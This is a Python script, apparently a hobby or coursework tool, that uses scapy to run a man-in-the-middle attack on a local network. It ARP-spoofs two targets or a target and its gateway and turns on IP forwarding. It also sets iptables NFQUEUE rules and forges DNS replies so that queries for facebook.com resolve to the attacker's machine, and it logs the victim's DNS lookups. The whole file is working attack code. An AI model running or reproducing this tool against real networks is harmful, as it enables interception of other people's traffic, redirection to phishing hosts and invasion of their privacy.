#!/usr/bin/python3.7m
from scapy.all import sniff, sendp, srp1flood, send, IP, ICMP, Ether, ARP, DNS, DNSQR, DNSRR, UDP, conf, sr1, get_if_hwaddr, fragment
import threading
from time import sleep
from arptable import ArpTable
from parser import parse_arguments
import os
from netfilterqueue import NetfilterQueue
import pyroute2
import socket, struct

#https://stackoverflow.com/a/6556951
def find_gateway(iface = conf.iface):
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
            
def mitm(macs, AttackerMac):
    def send_packet(packet):
        SourceMac = packet[Ether].src
        if SourceMac in macs:
            del packet[Ether].src
            del packet[IP].chksum
            packet[Ether].dst = macs[(macs.index(SourceMac)+1)%2]
            frags=fragment (packet)
            for f in frags:
                sendp (f, verbose=0)
            
    return send_packet
    

def get_macs (IpList):
    for ip in IpList:
        #ArpEntry = next((entry for entry in ArpTable if ip in entry.values()), None)
        mac = ArpTable.findMac(ip)
        if mac is not None:
            yield mac
        else:
            pa = srp1flood(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, hwdst='00:00:00:00:00:00', pdst=ip), verbose=1, timeout=7)    #Need an improvement (srp1?)
            
            if pa is None:
                yield '00:00:00:00:00:00'
            else:
                mac = pa.hwsrc
                ArpTable.addMac (ip, mac)
                yield mac


class ArpSpoof(threading.Thread):
    def __init__(self, SpoofedIps, SpoofedMacs, bidir=True):
        super(ArpSpoof, self).__init__()
        self.stoprequest = threading.Event()
        self.SpoofedIps = SpoofedIps
        self.SpoofedMacs = SpoofedMacs
        self.bidir = bidir

    def run(self):
        packets = [Ether(dst=self.SpoofedMacs[0])/ARP(op=2,hwdst=self.SpoofedMacs[0], psrc=self.SpoofedIps[1], pdst=self.SpoofedIps[0])]
        if self.bidir:
            packets.append(Ether(dst=self.SpoofedMacs[1])/ARP(op=2,hwdst=self.SpoofedMacs[1], psrc=self.SpoofedIps[0], pdst=self.SpoofedIps[1]))
        
        while not self.stoprequest.isSet():
            for p in packets:
                sendp(p, verbose=0)
            sleep (2)
     
    def rearp(self):
        for i in range (0, 2):
            sendp ((Ether(src=self.SpoofedMacs[i], dst=self.SpoofedMacs[(i+1)%2])/ARP(op=2, hwsrc=self.SpoofedMacs[i], psrc=self.SpoofedIps[i], hwdst=self.SpoofedMacs[(i+1)%2], pdst=self.SpoofedIps[(i+1)%2])), count=5, verbose=0)
        
        
    def join(self, timeout=None):
        self.stoprequest.set()
        super(ArpSpoof, self).join(timeout)
        #self.rearp()


class MITM():
    def __init__ (self, IpList, iface=conf.iface):
        self.IpList = IpList
        self.MacList = tuple(get_macs(IpList))
        self.LocalIp = IP(dst=IpList[1]).src
        self.LocalMac = get_if_hwaddr(iface)
        self.ArpSpoofThread = ArpSpoof (IpList, self.MacList)

    def start_mitm(self):
        self.enable_forward()
        self.ArpSpoofThread.start()

    def enable_forward (self, enable=1):
        os.system ("echo {} > /proc/sys/net/ipv4/ip_forward".format(enable))

    def start_DNS_spoof(self, ip=None, BlockCall=False):
        if not self.ArpSpoofThread.isAlive():
            raise RuntimeError ("MITM needed in order to start DNS Spoof")
        if ip is None:
            ip=self.LocalIp
        os.system("iptables -t mangle -A PREROUTING -p udp -s {} --dport 53 -j NFQUEUE --queue-num 1".format(self.IpList[0]))
        nfqueue = NetfilterQueue()
        nfqueue.bind(1, self._modify(ip))
        nfqueue.run(block=BlockCall)
        
    def clean_exit(self):
        self.enable_forward(0)
        os.system("iptables -t mangle -D PREROUTING -p udp -s {} --dport 53 -j NFQUEUE --queue-num 1".format(self.IpList[0]))
        self.ArpSpoofThread.join()
       
    def _modify(self, ip):
        def modify(packet):
            pkt = IP(packet.get_payload())
            if pkt.qd.qname ==b'facebook.com.':
                print (pkt.show())
                p = Ether(dst=self.MacList[0], src=self.LocalMac, type=2048)/IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(id=pkt[DNS].id, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=pkt[DNS].qd.qname, qtype=1, qclass=1), an=DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=1, rdata=ip), ns=None, ar=None)
                sendp(p, verbose=0)
                #packet.set_payload(bytes(str(pkt), 'utf-8')) #set the packet content to our modified version
                packet.drop() #drop the packet
            else:
                packet.accept()
        return modify



def main():
    arguments = parse_arguments()
    IP1 = arguments.target1 #"10.150.0.1"
    if arguments.UseGateway is True:
        IP2 = find_gateway()
    else:
        IP2 = arguments.target2
    print ("IP1: {}\nIP2: {}".format(IP1, IP2))
    FiltroDNS="udp port 53 and ip src {}".format(IP1)
    mitm = MITM((IP1, IP2))
    print ("Mac Addrs = {}".format(mitm.MacList))
    mitm.start_mitm()
    try:
        #mitm.start_DNS_spoof(BlockCall=True)
        print(sniff(store=False, prn=lambda x: print("Intento de acceso a {}".format(str(x.qd.qname, 'utf-8'))), filter=FiltroDNS))
    except KeyboardInterrupt:
        mitm.clean_exit()


if __name__ == "__main__":
    main()
